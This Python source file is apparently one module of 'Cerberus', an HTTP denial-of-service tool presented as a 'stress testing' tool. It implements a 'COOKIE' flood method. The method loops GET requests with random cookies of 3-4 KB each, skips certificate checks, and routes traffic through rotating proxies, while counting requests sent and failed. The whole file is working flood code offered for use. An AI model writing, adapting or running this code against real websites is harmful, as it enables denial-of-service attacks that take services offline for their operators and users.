'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

#                .---. .---.
#               :     : o   :    me want cookie!
#           _..-:   o :     :-.._    /
#       .-''  '  `---' `---' "   ``-.
#     .'   "   '  "  .    "  . '  "  `.
#    :   '.---.,,.,...,.,.,.,..---.  ' ;
#    `. " `.                     .' " .'
#     `.  '`.                   .' ' .'
#      `.    `-._           _.-' "  .'  .----.
#        `. "    '"--...--"'  . ' .'  .'  o   `.
#        .'`-._'    " .     " _.-'`. :       o  :
#  jgs .'      ```--.....--'''    ' `:_ o       :
#    .'    "     '         "     "   ; `.;";";";'
#   ;         '       "       '     . ; .' ; ; ;
#  ;     '         '       '   "    .'      .-'
#  '  "     "   '      "           "    _.-'

import time, requests

from src.core import Core
from src.utils import *
from src.useragent import *
from random import randint

def flood(attack_id, url, stoptime) -> None:
    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:

            headers = utils().buildheaders(url)
            headers['Cookie'] = utils().randstr(randint(3072, 4096), chars='QWERTYUIOPASDFGHJKLZXCVBNM01234567890')

            Core.session.get(
                utils().buildblock(url),
                headers=headers,
                verify=False, 
                timeout=(5,1), 
                allow_redirects=False,
                stream=False,
                cert=None,
                proxies=utils().get_proxy()
            )

            Core.infodict[attack_id]['req_sent'] += 1
        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception as e:
            print(e)
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'COOKIE': {
        'info': 'HTTP GET flood with large cookies, tasty!',
        'func': flood
    }
})